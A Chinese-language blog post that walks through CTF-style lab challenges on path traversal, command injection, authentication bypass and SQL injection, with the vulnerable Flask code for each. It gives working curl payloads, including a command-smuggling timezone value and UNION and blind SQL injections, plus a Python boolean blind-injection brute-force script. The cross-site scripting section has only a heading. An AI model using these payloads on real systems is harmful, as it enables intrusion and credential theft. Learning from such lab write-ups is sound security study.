---
layout: post
tags: [web]
title: "常见web漏洞"
date: 2024-8-2
author: wsxk
comments: true
---

- [3. 常见web漏洞](#3-常见web漏洞)
  - [3.1 路径遍历漏洞](#31-路径遍历漏洞)
  - [3.2 命令注入](#32-命令注入)
  - [3.3 身份验证绕过](#33-身份验证绕过)
  - [3.4 SQL注入](#34-sql注入)
  - [3.5 跨站脚本](#35-跨站脚本)


## 3. 常见web漏洞<br>
### 3.1 路径遍历漏洞<br>
路径遍历漏洞指的是**允许攻击者在未经授权的情况下读取服务器上任意文件的安全漏洞**<br>
例子:<br>
```
# 路径遍历漏洞的参数通常是../../../flag 
curl http://challenge.localhost:80/?path=../flag
```

### 3.2 命令注入<br>
命令注入指的是**攻击者可以控制变量作为命令被执行而导致的安全漏洞**<br>
比如有如下代码:<br>
```python
def level2():
    timezone = request.args.get("timezone", "UTC")
    return subprocess.check_output(f"TZ={timezone} date", shell=True, encoding="latin") # 存在命令注入，timezone为用户可控，可以通过插入UTC cat /flag; 来使整个字符串变为
    # TZ=UTC cat /flag; date
```
可以通过如下命令获得flag<br>
```
 curl http://challenge.localhost:80/?timezone=UTC%20cat%20/flag%3b
```

### 3.3 身份验证绕过<br>
有的人在写代码对身份的校验出现了问题，导致身份验证可以被绕过，攻击者不需要输入密码即可获得用户权限<br>
```python
def level3():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))
    
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f"SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
        assert user, "Invalid `username` or `password`"

        return redirect(request.path, user=int(user["rowid"]))
    # 逻辑出现错误，即使不发送post请求验证身份，也可以执行登陆后的执行逻辑。
    if "user" in request.args:
        user_id = int(request.args["user"])
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```
只需要发送请求`curl http://challenge.localhost:80/?user=1`即可绕过<br>

### 3.4 SQL注入<br>
`sql注入`发生在攻击者的输入可以影响到sql语句的查询的场景下，<br>

```python
def level4():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone() # 存在sql注入
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            if username == "flag":
                return f"{flag}\n"
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```
利用方法:<br>
`curl -X POST -d "username=flag%22%20or%20%221%22=%221&password=wsxk" -i -c cookies.txt http://challenge.localhost:80`<br>
发送上述请求后的sql实际展开为`SELECT rowid, * FROM users WHERE username = "flag" or "1"="1" AND password = "wsxk"`<br>
随后发送`curl -b cookies.txt http://challenge.localhost:80`即可获取flag<br>
**SQL注入的攻击模式不止上述一种**<br>
```python
# 在不打印我们想要的列时，可以通过UNION查询打印我们需要的列的值
def level5():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM users WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)
# curl http://challenge.localhost:80/?query=%25%22%20union%20select%20password%20from%20users%20where%20%221%22=%221
# 实际上的式子等于 SELECT username FROM users WHERE username LIKE "%" union select password from users where "1"="1"
```
还有<br>
```python
# 在表名未知，且不打印所需列的值时，可以通过两步：利用union从sqlite_master中取出tbl_name得知表名，再利用union获取所需列
def level6():
    table_name = f"table{hash(flag) & 0xFFFFFFFFFFFFFFFF}"
    db.execute((f"CREATE TABLE IF NOT EXISTS {table_name} AS "
                'SELECT "flag" AS username, ? AS password'),
               (flag,))

    query = request.args.get("query", "%")
    users = db.execute(f'SELECT username FROM {table_name} WHERE username LIKE "{query}"').fetchall()
    return "".join(f'{user["username"]}\n' for user in users)

# curl http://challenge.localhost:80/?query=%25%22%20union%20select%20tbl_name%20from%20sqlite_master%20where%20%221%22=%221

# curl http://challenge.localhost:80/?query=%25%22%20union%20select%20password%20from%20table18222469061300079216%20where%20%221%22=%221
```

最后一种`sql注入`就是盲注了<br>
盲注分为两种**布尔盲注和时间盲注**<br>
**布尔盲注是在能够得知系统的响应（是否存在特定的文本）来推测数据内容**<br>
**时间盲注发生在无法得知系统响应时（没有回显），可以通过`username=flag&password=admin' OR IF(substr(password,1,1)='a', SLEEP(5), 0) --`来得知结果**<br>

```python
def level7():
    db.execute(("CREATE TABLE IF NOT EXISTS users AS "
                'SELECT "flag" AS username, ? as password'),
               (flag,))

    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        assert username, "Missing `username` form"
        assert password, "Missing `password` form"

        user = db.execute(f'SELECT rowid, * FROM users WHERE username = "{username}" AND password = "{password}"').fetchone() #利用盲注输出爆破flag
        assert user, "Invalid `username` or `password`"

        session["user"] = int(user["rowid"])
        return redirect(request.path)

    if session.get("user"):
        user_id = int(session.get("user", -1))
        user = db.execute("SELECT * FROM users WHERE rowid = ?", (user_id,)).fetchone()
        if user:
            username = user["username"]
            return f"Hello, {username}!\n"

    return form(["username", "password"])
```
上述题目，由于我们可以拿到回显，所以使用布尔盲注即可解题<br>
```python
import requests

url = 'http://challenge.localhost:80'

charset=""
for i in range(0,256):
    charset += chr(i)

def find_password():
    print("start")
    password = ''
    for position in range(1, 60):  # 假设密码最大长度为60
        for char in charset:
            # 发送POST请求尝试猜测每个字符
            payload = {
                'username': 'flag',
                'password': f'admin" OR substr(password,{position},1)="{char}" -- '
            }
            response = requests.post(url, data=payload)

            if "Hello, flag!" in response.text:
                print(f"Found character {char} at position {position}")
                password += char
                break
    return password

print("Password is:", find_password())
```

### 3.5 跨站脚本<br>
